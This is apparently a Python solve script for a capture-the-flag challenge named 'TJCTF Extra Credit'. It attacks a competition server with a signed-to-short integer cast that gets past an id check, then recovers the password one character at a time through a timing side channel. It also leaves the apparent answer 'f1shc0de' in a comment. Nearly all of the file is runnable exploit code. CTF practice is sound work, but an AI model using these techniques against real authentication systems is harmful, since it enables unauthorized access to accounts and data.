#!/usr/bin/env python3
import socket
import time
import string

def connect_to_server():
    """Connect to the remote server"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('tjc.tf', 31624))
    return s

def send_and_receive(sock, data):
    """Send data and receive response"""
    sock.send(data.encode() + b'\n')
    time.sleep(0.1)  # Small delay to ensure response
    response = sock.recv(4096).decode()
    return response

def test_teacher_access():
    """Test if we can access teacher view with our exploit value"""
    # Calculate the exploit value: we need a negative number that becomes 0x0BEE when cast to short
    target = 0x0BEE  # 3054
    exploit_value = target - 65536  # -62482
    
    print(f"Target: 0x{target:x} ({target})")
    print(f"Exploit value: {exploit_value}")
    print(f"Passes id <= 10 check: {exploit_value <= 10}")
    
    # Verify the cast works
    import ctypes
    result = ctypes.c_short(exploit_value).value
    print(f"When cast to short: {result} (0x{result & 0xFFFF:x})")
    
    sock = connect_to_server()
    
    # Read initial prompt
    initial = sock.recv(4096).decode()
    print("Server says:", initial)
    
    # Send exploit value
    response = send_and_receive(sock, str(exploit_value))
    print("Response:", response)
    
    if "Enter your password" in response:
        print("‚úÖ Successfully accessed teacher view!")
        return sock
    else:
        print("‚ùå Failed to access teacher view")
        sock.close()
        return None

def timing_attack_char(sock, current_password, charset, position):
    """Perform timing attack for a single character"""
    best_char = None
    max_time = 0
    times = {}
    
    print(f"Testing position {position + 1}...")
    
    for char in charset:
        test_password = current_password + char
        
        # Test each character multiple times for accuracy
        char_times = []
        for _ in range(3):
            sock = connect_to_server()
            
            # Skip initial prompt
            sock.recv(4096)
            
            # Send exploit value
            sock.send(str(-62482).encode() + b'\n')
            time.sleep(0.1)
            sock.recv(4096)  # Skip response
            
            # Time the password check
            start_time = time.time()
            sock.send(test_password.encode() + b'\n')
            response = sock.recv(4096).decode()
            elapsed = time.time() - start_time
            
            char_times.append(elapsed)
            sock.close()
        
        avg_time = sum(char_times) / len(char_times)
        times[char] = avg_time
        print(f"  {char}: {avg_time:.4f}s")
        
        if avg_time > max_time:
            max_time = avg_time
            best_char = char
    
    return best_char, times

def timing_attack():
    """Perform complete timing attack to find password"""
    charset = string.ascii_lowercase + string.digits
    password = ""
    
    print("\nüîç Starting timing attack...")
    
    for position in range(20):  # Assume max 20 characters
        best_char, times = timing_attack_char(None, password, charset, position)
        
        if best_char is None:
            print("No clear winner found, password might be complete")
            break
        
        password += best_char
        print(f"Current password: '{password}'")
        
        # Test if password is complete
        sock = connect_to_server()
        sock.recv(4096)  # Initial prompt
        
        sock.send(str(-62482).encode() + b'\n')
        time.sleep(0.1)
        sock.recv(4096)  # Teacher view prompt
        
        sock.send(password.encode() + b'\n')
        response = sock.recv(4096).decode()
        
        if "Access granted" in response:
            print(f"\nüéâ Password found: '{password}'")
            print("Getting flag...")
            
            # The flag should be displayed after "Access granted"
            # Wait a bit more to get the full response
            time.sleep(0.5)
            try:
                more_response = sock.recv(4096).decode()
                response += more_response
            except:
                pass
            
            print("Full response:")
            print(response)
            sock.close()
            return password
        
        sock.close()
    
    return password

def manual_test():
    """Manual test to verify exploit works"""
    print("\nüß™ Manual test:")
    sock = connect_to_server()
    
    # Read initial prompt
    initial = sock.recv(4096).decode()
    print("Initial:", initial)
    
    # Send exploit value
    sock.send(str(-62482).encode() + b'\n')
    time.sleep(0.1)
    response = sock.recv(4096).decode()
    print("After exploit value:", response)
    
    if "Enter your password" in response:
        print("‚úÖ Exploit works! Now try a test password...")
        sock.send(b"test\n")
        final = sock.recv(4096).decode()
        print("Final response:", final)
    
    sock.close()

if __name__ == "__main__":
    print("=== TJCTF Extra Credit Exploit ===")
    
    # First, test basic functionality
    manual_test()
    
    # Then perform timing attack
    password = timing_attack()
    # f1shc0de
    if password:
        print(f"\nüèÜ Final password: '{password}'")
    else:
        print("\n‚ùå Failed to find password")
